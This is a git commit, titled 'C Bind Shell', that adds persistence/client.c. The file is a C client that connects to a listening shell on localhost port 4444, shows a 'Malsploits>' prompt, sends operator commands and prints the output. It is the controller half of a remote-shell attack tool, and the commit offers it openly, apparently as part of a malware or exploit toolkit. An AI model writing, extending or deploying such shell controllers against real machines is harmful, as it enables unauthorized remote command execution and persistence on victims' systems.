f9e7fb75053d7cde92ac4f265b94ed2551eb9f43
Ryan <1ryan1wong@gmail.com>
2025-04-01 01:07:32 -0700

    C Bind Shell

---
+++ persistence/client.c
@@ -0,0 +1,67 @@
+#include <arpa/inet.h>
+#include <stdio.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <unistd.h>
+#include <signal.h>
+#include <stdbool.h>
+#define PORT 4444
+#define BUFFER_SIZE 8192
+
+#define GREEN "\e[1;32m"
+#define CYAN "\e[1;36m"
+#define RED "\e[1;31m"
+#define RESET "\033[0m"
+
+//Catch Ctrl+C
+static volatile int keepRunning = 1;
+
+void intHandler(int dummy) {
+    keepRunning = 0;
+}
+
+int main(int argc, char const* argv[])
+{
+    int status, received, client_fd;
+    struct sockaddr_in serv_addr;
+    char command[BUFFER_SIZE];
+    char buffer[BUFFER_SIZE] = { 0 };
+
+    if ((client_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+        printf("\n Socket creation error \n");
+        return -1;
+    }
+
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_port = htons(PORT);
+
+    // Convert IPv4 and IPv6 addresses from text to binary
+    // form
+    if (inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr) <= 0) {
+        printf("\nInvalid address/ Address not supported \n");
+        return -1;
+    }
+
+    if ((status = connect(client_fd, (struct sockaddr*)&serv_addr, sizeof(serv_addr))) < 0) {
+        printf("\nConnection Failed \n");
+        return -1;
+    }
+
+    while(keepRunning) {
+        
+        printf(CYAN "Malsploits> " RESET);
+        if (fgets(command, BUFFER_SIZE, stdin) == NULL) {
+            printf("Invalid Command");
+        }
+
+        send(client_fd, command, strlen(command), 0);
+
+        memset(buffer, 0, BUFFER_SIZE);
+        received = read(client_fd, buffer, BUFFER_SIZE - 1);
+        printf("%s", buffer);
+    }
+
+    // closing the connected socket
+    close(client_fd);
+    return 0;
+}
